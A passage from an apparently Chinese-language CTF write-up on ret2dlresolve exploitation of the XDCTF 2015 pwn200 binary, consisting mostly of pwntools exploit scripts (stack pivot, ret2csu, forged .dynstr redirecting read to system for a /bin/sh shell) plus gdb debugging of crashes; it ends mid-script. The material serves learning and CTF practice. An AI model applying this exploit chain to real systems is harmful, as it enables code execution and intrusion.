rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>new_stack<span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># now, we are on the new stack</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x600B30</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake dynstr location</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake dynstr</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>直接运行，发现不行，经过调试发现程序在 0x7f2512db3e69 处崩了。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly"> RAX  0x600998 (_DYNAMIC+144) ◂— 0x6
 RBX  0x600d98 ◂— 0x6161616161616161 ('aaaaaaaa')
 RCX  0x7f2512ac3191 (read+17) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x9
 RDI  0x600b30 (stdout@@GLIBC_2.2.5) ◂— 0x0
 RSI  0x3
 R8   0x50
 R9   0x7f2512faf4c0 ◂— 0x7f2512faf4c0
 R10  0x7f2512fcd170 ◂— 0x0
 R11  0x246
 R12  0x6161616161616161 ('aaaaaaaa')
 R13  0x6161616161616161 ('aaaaaaaa')
 R14  0x6161616161616161 ('aaaaaaaa')
 R15  0x6161616161616161 ('aaaaaaaa')
 RBP  0x6161616161616161 ('aaaaaaaa')
 RSP  0x6009e0 (_DYNAMIC+216) —▸ 0x600ae8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x0
 RIP  0x7f2512db3e69 (_dl_fixup+41) ◂— mov    rcx, qword ptr [r8 + 8]
──────[ DISASM ]────────
   0x7f2512db3e52 <_dl_fixup+18>    mov    rdi, qword ptr [rax + 8]
   0x7f2512db3e56 <_dl_fixup+22>    mov    rax, qword ptr [r10 + 0xf8]
   0x7f2512db3e5d <_dl_fixup+29>    mov    rax, qword ptr [rax + 8]
   0x7f2512db3e61 <_dl_fixup+33>    lea    r8, [rax + rdx*8]
   0x7f2512db3e65 <_dl_fixup+37>    mov    rax, qword ptr [r10 + 0x70]
 ► 0x7f2512db3e69 <_dl_fixup+41>    mov    rcx, qword ptr [r8 + 8] <0x7f2512ac3191><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>经过逐步调试发现，在 <code>_dl_runtime_resolve</code> 会在栈中保存大量的数据</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">.text:00000000000177A0 ; __unwind {
.text:00000000000177A0                 push    rbx
.text:00000000000177A1                 mov     rbx, rsp
.text:00000000000177A4                 and     rsp, 0FFFFFFFFFFFFFFC0h
.text:00000000000177A8                 sub     rsp, cs:qword_227808
.text:00000000000177AF                 mov     [rsp+8+var_8], rax
.text:00000000000177B3                 mov     [rsp+8], rcx
.text:00000000000177B8                 mov     [rsp+8+arg_0], rdx
.text:00000000000177BD                 mov     [rsp+8+arg_8], rsi
.text:00000000000177C2                 mov     [rsp+8+arg_10], rdi
.text:00000000000177C7                 mov     [rsp+8+arg_18], r8
.text:00000000000177CC                 mov     [rsp+8+arg_20], r9
.text:00000000000177D1                 mov     eax, 0EEh
.text:00000000000177D6                 xor     edx, edx
.text:00000000000177D8                 mov     [rsp+8+arg_240], rdx
.text:00000000000177E0                 mov     [rsp+8+arg_248], rdx
.text:00000000000177E8                 mov     [rsp+8+arg_250], rdx
.text:00000000000177F0                 mov     [rsp+8+arg_258], rdx
.text:00000000000177F8                 mov     [rsp+8+arg_260], rdx
.text:0000000000017800                 mov     [rsp+8+arg_268], rdx
.text:0000000000017808                 xsavec  [rsp+8+arg_30]
.text:000000000001780D                 mov     rsi, [rbx+10h]
.text:0000000000017811                 mov     rdi, [rbx+8]
.text:0000000000017815                 call    sub_FE40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中 qword_227808 处的值为0x0000000000000380。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> x/gx 0x7f2512da4000+0x227808
0x7f2512fcb808 <_rtld_global_ro+168>:    0x0000000000000380<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当执行完下面的指令后</p>
<pre class="line-numbers language-assembly"><code class="language-assembly"> ► 0x7f2512dbb7a8 <_dl_runtime_resolve_xsavec+8>     sub    rsp, qword ptr [rip + 0x210059] <0x7f2512fcb808><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>栈地址到了 0x600a00（我们是将栈迁移到了 bss_addr+0x100，即 0x600C30），即到了 .dynamic 节中，后续在栈中保存数据时会破坏 .dynamic 节中的内容，最后导致了 dl_fixup 崩溃。</p>
<pre><code>   0x7f2512dbb7a0 &lt;_dl_runtime_resolve_xsavec&gt;       push   rbx
   0x7f2512dbb7a1 &lt;_dl_runtime_resolve_xsavec+1&gt;     mov    rbx, rsp
   0x7f2512dbb7a4 &lt;_dl_runtime_resolve_xsavec+4&gt;     and    rsp, 0xffffffffffffffc0
   0x7f2512dbb7a8 &lt;_dl_runtime_resolve_xsavec+8&gt;     sub    rsp, qword ptr [rip + 0x210059] &lt;0x7f2512fcb808&gt;
 ► 0x7f2512dbb7af &lt;_dl_runtime_resolve_xsavec+15&gt;    mov    qword ptr [rsp], rax &lt;0x600a00&gt;
   0x7f2512dbb7b3 &lt;_dl_runtime_resolve_xsavec+19&gt;    mov    qword ptr [rsp + 8], rcx
   0x7f2512dbb7b8 &lt;_dl_runtime_resolve_xsavec+24&gt;    mov    qword ptr [rsp + 0x10], rdx
   0x7f2512dbb7bd &lt;_dl_runtime_resolve_xsavec+29&gt;    mov    qword ptr [rsp + 0x18], rsi
   0x7f2512dbb7c2 &lt;_dl_runtime_resolve_xsavec+34&gt;    mov    qword ptr [rsp + 0x20], rdi
   0x7f2512dbb7c7 &lt;_dl_runtime_resolve_xsavec+39&gt;    mov    qword ptr [rsp + 0x28], r8
─────────────────────[ STACK ]─────────────────
00:0000│ rsp  0x600a00 (_DYNAMIC+248) ◂— 0x7
01:0008│      0x600a08 (_DYNAMIC+256) ◂— 0x17
02:0010│      0x600a10 (_DYNAMIC+264) —▸ 0x400450 —▸ 0x600b00 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7f2512ac3250 (write) ◂— lea    rax, [rip + 0x2e06a1]
03:0018│      0x600a18 (_DYNAMIC+272) ◂— 0x7
04:0020│      0x600a20 (_DYNAMIC+280) —▸ 0x4003f0 —▸ 0x600ad8 —▸ 0x7f25129d4ab0 (__libc_start_main) ◂— push   r13
05:0028│      0x600a28 (_DYNAMIC+288) ◂— 0x8
06:0030│      0x600a30 (_DYNAMIC+296) ◂— 0x60 /* '`' */
07:0038│      0x600a38 (_DYNAMIC+304) ◂— 9 /* '\t' */</code></pre><p>或许我们可以考虑把栈再迁移的高一些，但是，程序中与 bss 相关的映射只有 0x600000-0x601000，即一页。与此同时</p>
<ul>
<li>bss 段的起始地址为 0x600B30</li>
<li>伪造的栈的数据一共有 392 （0x188）</li>
</ul>
<p>所以直接栈迁移到 bss节很容易出现问题。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
          0x600000           0x601000 rw-p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64
    0x7f25129b3000     0x7f2512b9a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512b9a000     0x7f2512d9a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9a000     0x7f2512d9e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512d9e000     0x7f2512da0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f2512da0000     0x7f2512da4000 rw-p     4000 0      
    0x7f2512da4000     0x7f2512dcb000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fae000     0x7f2512fb0000 rw-p     2000 0      
    0x7f2512fcb000     0x7f2512fcc000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcc000     0x7f2512fcd000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7f2512fcd000     0x7f2512fce000 rw-p     1000 0      
    0x7fff26cdd000     0x7fff26cff000 rw-p    22000 0      [stack]
    0x7fff26d19000     0x7fff26d1c000 r--p     3000 0      [vvar]
    0x7fff26d1c000     0x7fff26d1e000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但经过精细的调节，我们还是避免破坏 .dynamic 节的内容</p>
<ul>
<li>修改迁移后的栈的地址为 bss_addr+0x200，即 0x600d30</li>
<li>修改迁移后的栈的大小为 0x188</li>
</ul>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
<span class="token comment" spellcheck="true"># context.terminal = ["tmux","splitw","-h"]</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
csu_front_addr <span class="token operator">=</span> <span class="token number">0x400750</span>
csu_end_addr <span class="token operator">=</span> <span class="token number">0x40076A</span>
leave_ret  <span class="token operator">=</span><span class="token number">0x40063c</span>
poprbp_ret <span class="token operator">=</span> <span class="token number">0x400588</span>
<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class="token comment" spellcheck="true"># rbx = 0</span>
    <span class="token comment" spellcheck="true"># rbp = 1, enable not to jump</span>
    <span class="token comment" spellcheck="true"># r12 should be the function that you want to call</span>
    <span class="token comment" spellcheck="true"># rdi = edi = r13d</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdx = r15</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
    <span class="token keyword">return</span> payload

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set rsp = new_stack</span>
stack_size <span class="token operator">=</span> <span class="token number">0x188</span> <span class="token comment" spellcheck="true"># new stack size is 0x188</span>
new_stack <span class="token operator">=</span> bss_addr<span class="token operator">+</span><span class="token number">0x200</span>

offset <span class="token operator">=</span> <span class="token number">112</span><span class="token operator">+</span><span class="token number">8</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
payload1 <span class="token operator">=</span> csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>new_stack<span class="token punctuation">,</span>stack_size<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x400607</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># construct fake stack</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600988</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># modify .dynstr pointer in .dynamic section to a specific location</span>
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>
dynstr <span class="token operator">=</span> dynstr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600B30</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># construct a fake dynstr section</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600B30</span><span class="token operator">+</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># read /bin/sh\x00</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x0000000000400773</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rdi; ret</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x600B30</span><span class="token operator">+</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x400516</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># the second instruction of read@plt </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span>stack_size<span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># reuse the vuln to stack pivot</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>new_stack<span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># now, we are on the new stack</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x600B30</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake dynstr location</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake dynstr</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>此时，我们发现程序又崩了，通过 coredump</p>
<pre class="line-numbers language-bash"><code class="language-bash">❯ gdb -c core<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我们发现，在处理 xmm 相关的指令时崩了</p>
<pre><code> ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0
   0x7fa8677a339b    call   0x7fa8677931c0 &lt;0x7fa8677931c0&gt;

   0x7fa8677a33a0    lea    rsi, [rip + 0x39e259]
   0x7fa8677a33a7    xor    edx, edx
   0x7fa8677a33a9    mov    edi, 3
   0x7fa8677a33ae    call   0x7fa8677931c0 &lt;0x7fa8677931c0&gt;

   0x7fa8677a33b3    xor    edx, edx
   0x7fa8677a33b5    mov    rsi, rbp
   0x7fa8677a33b8    mov    edi, 2
   0x7fa8677a33bd    call   0x7fa8677931f0 &lt;0x7fa8677931f0&gt;

   0x7fa8677a33c2    mov    rax, qword ptr [rip + 0x39badf]
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x600d18 ◂— 0x0
01:0008│      0x600d20 —▸ 0x7fa8679080f7 ◂— 0x2f6e69622f00632d /* '-c' */
02:0010│      0x600d28 ◂— 0x0
03:0018│      0x600d30 —▸ 0x40076a ◂— pop    rbx
04:0020│      0x600d38 —▸ 0x7fa8677a3400 ◂— 0x9be1f8b53
05:0028│      0x600d40 —▸ 0x600d34 ◂— 0x677a340000000000
06:0030│      0x600d48 ◂— 0x8000000000000006
07:0038│      0x600d50 ◂— 0x0
</code></pre><p>由于 xmm 相关指令要求地址应该是 16 字节对齐的，而此时 rsp 并不是 16 字节对齐的。因此我们可以简单地调整一下栈，来使得栈是 16 字节对齐的。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
<span class="token comment" spellcheck="true"># context.terminal = ["tmux","splitw","-h"]</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
csu_front_addr <span class="token operator">=</span> <span class="token number">0x400750</span>
csu_end_addr <span class="token operator">=</span> <span class="token number">0x40076A</span>
leave_ret  <span class="token operator">=</span><span class="token number">0x40063c</span>
poprbp_ret <span class="token operator">=</span> <span class="token number">0x400588</span>
<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class="token comment" spellcheck="true"># rbx = 0</span>
    <span class="token comment" spellcheck="true"># rbp = 1, enable not to jump</span>
    <span class="token comment" spellcheck="true"># r12 should be the function that you want to call</span>
    <span class="token comment" spellcheck="true"># rdi = edi = r13d</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdx = r15</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
    <span class="token keyword">return</span> payload

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set rsp = new_stack</span>
stack_size <span class="token operator">=</span> <span class="token number">0x1a0</span> <span class="token comment" spellcheck="true"># new stack size is 0x1a0</span>
new_stack <span class="token operator">=</span> bss_addr<span class="token operator">+</span><span class="token number">0x200</span>

